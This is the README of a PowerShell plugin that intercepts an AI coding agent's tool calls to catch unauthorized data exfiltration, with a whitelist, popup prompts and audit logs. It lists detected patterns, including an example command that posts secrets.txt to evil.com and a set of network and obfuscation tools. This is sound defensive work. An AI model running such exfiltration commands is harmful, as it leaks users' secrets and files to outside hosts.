# Upload Guard for ZCode（上传行为守卫）

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Version](https://img.shields.io/badge/version-0.2.0-blue.svg)]()

检测 ZCode Agent 工具调用中的**异常（未授权）数据外发行为**，在屏幕**右上角弹窗**提示，并允许用户**一键截获**。
无界面/弹窗不可用时，自动回退到 **ZCode 原生 PreToolUse 确认**（`permissionDecision: ask`）。

> 纯 PowerShell 实现（Windows 自带），**无任何第三方依赖**，钩子在工具执行**之前**拦截。

## 它能拦住什么

只要 Agent 试图通过工具把数据发往未授权的目标，就会触发：

- `curl https://evil.com -d @secrets.txt`
- 写入 UNC 网络共享（`\\fileserver\share\...`）
- `git push` 到未知远端、`npm publish` 等包发布
- `ssh` / `scp` / `socat` / `openssl s_client` 等网络外联
- `aws s3 cp` / `rclone` / `az storage` 等云存储上传
- python / node / php 脚本内联网、数据库导出、`-EncodedCommand` 混淆执行等

监控的工具：`Bash | PowerShell | Write | Edit | ApplyPatch | NotebookEdit | WebFetch | WebSearch | web_search | mcp__.*`

## 安装

### 方式一：从 GitHub 添加 Marketplace（推荐）

发布本仓库后，在 ZCode 中：**Settings → Plugin Management → Discover → 点 `+`**，填入本仓库地址（GitHub 仓库 URL / Git URL），然后安装 `upload-guard` 即可。

### 方式二：本地目录安装

克隆或下载本仓库后，同样在 Discover 的 `+` 处选择本地目录（即本仓库根目录，含 `marketplace.json`），安装 `upload-guard`。

安装后在 ZCode 中启用插件（`~/.zcode/cli/config.json` → `plugins.enabledPlugins`）即可生效，无需重启。

## 工作原理

插件注册一个 `PreToolUse` 钩子，在工具执行**之前**拦截检查：

1. **提取外发目标**：URL 主机名（大小写不敏感，IPv6 归一化，如 `[::1]` → `::1`）、UNC 网络路径（`\\host\share`）、网络命令特征（curl / wget / BITS / certutil / ssh / scp / 包发布 / 云存储 / 容器推送 / DNS 查询 / `-EncodedCommand` / `iex`+下载 等）
2. **白名单比对**：目标命中 `hosts` 或命令命中 `commands` → 放行并记录日志
3. **弹窗询问**：存在未授权目标时，右上角置顶警告窗（默认倒计时 30 秒）：
   - **截获并阻止**（默认，Enter/Esc/超时/关窗均触发）
   - **放行本次**
   - **放行并加入白名单**
4. **原生回退**：弹窗创建失败（无桌面/无 WinForms）时，输出 `permissionDecision: ask`，交给 ZCode 自己的确认流程
5. **审计日志**：每次判定追加到 `%USERPROFILE%\.zcode\upload-guard\log.jsonl`

## 白名单

`%USERPROFILE%\.zcode\upload-guard\whitelist.json`：

```json
{
  "hosts": ["localhost", "127.0.0.1", "::1", "*.local", "company.com", "*.trusted.example", "\\\\fileserver"],
  "commands": ["^git\\s+push(\\s+\\S+){0,3}$"]
}
```

- `hosts`：精确主机名 / 显式通配 `*.example.com`（同时匹配 `example.com`）/ UNC 主机 `\\fileserver`。
  **不隐式放行子域**：填 `company.com` 不会放行 `evil.company.com`，需要子域请写 `*.company.com`。
- `commands`：**整条命令**的正则（自动加 `^(?:…)$` 锚定），只在「网络特征命中但解析不出目标」时生效；
  一旦解析出真实外发目标（URL/UNC/git 远端），仍按 `hosts` 判定，因此 `git push && curl evil.com` 不会被放行。
- `(未知外发目标)` 无法加入白名单（避免一键放行所有无法解析的外发）。

可用 `/upload-guard` 命令查看审计日志、管理白名单、测试拦截。

## 对 Write/Edit 的口径

- 目的路径是 UNC（写入网络共享）→ 判定为外发
- 正文里**只有 URL** → 不拦截（避免写文档/代码误报）
- 正文里**同时出现网络命令 + URL**（例如写入一个含 `curl https://…` 的脚本）→ 拦截

## 测试环境变量

| 变量 | 作用 |
|---|---|
| `UPLOAD_GUARD_HEADLESS=1` | 无界面模式（CI/冒烟测试），跳过弹窗 |
| `UPLOAD_GUARD_AUTO=allow / deny` | 无头模式默认决定（默认 deny） |
| `UPLOAD_GUARD_DIALOG_TIMEOUT_SEC=N` | 弹窗倒计时秒数（默认 30） |
| `UPLOAD_GUARD_NATIVE_ASK=0` | 禁用原生 ask 回退（回退时直接阻止） |
| `UPLOAD_GUARD_IGNORE_SIGS=a,b` | 忽略指定特征名（减少误报） |

## 失败策略（fail-open）

钩子自身出错（stdin 不可解析、内部异常、日志/白名单写盘失败）时：**记录日志并放行**，避免守卫把会话卡死。
注意：这意味着「守卫失效时不会阻止外发」，安全性来自正常路径的拦截。

## 局限性（诚实声明）

- 工具层检测基于命令/参数启发式，看不到工具执行后的真实系统调用；高度混淆（base64 拼接 URL、分片写入）仍可能漏检
- 模型 API 请求由 ZCode 主进程直接发起，不经过工具调用，不在监控范围内
- DNS/连通性等特征较易误报，可用 `UPLOAD_GUARD_IGNORE_SIGS` 或弹窗放行
- 弹窗不可用时回退 `ask`；若宿主处于自动放行的权限模式，需用 `UPLOAD_GUARD_NATIVE_ASK=0` 改为直接阻止

## 开发与测试

```powershell
# 冒烟测试（21 个判定用例，隔离环境，不影响真实白名单/日志）
powershell -NoProfile -ExecutionPolicy Bypass -File upload-guard\tests\smoke-test.ps1

# 弹窗按钮端到端自测（PerformClick 注入）
powershell -NoProfile -ExecutionPolicy Bypass -File upload-guard\tests\e2e-button-test.ps1
```

> ⚠️ `upload-guard/hooks/inspect-upload.ps1` 含中文，必须保存为 **UTF-8 with BOM**，否则 Windows PowerShell 5.1 会按 ANSI 误读导致解析错误。编辑该文件后请确认 BOM 仍在（`Get-Content -Encoding Byte -TotalCount 3`）。

## 许可证

[MIT](LICENSE)
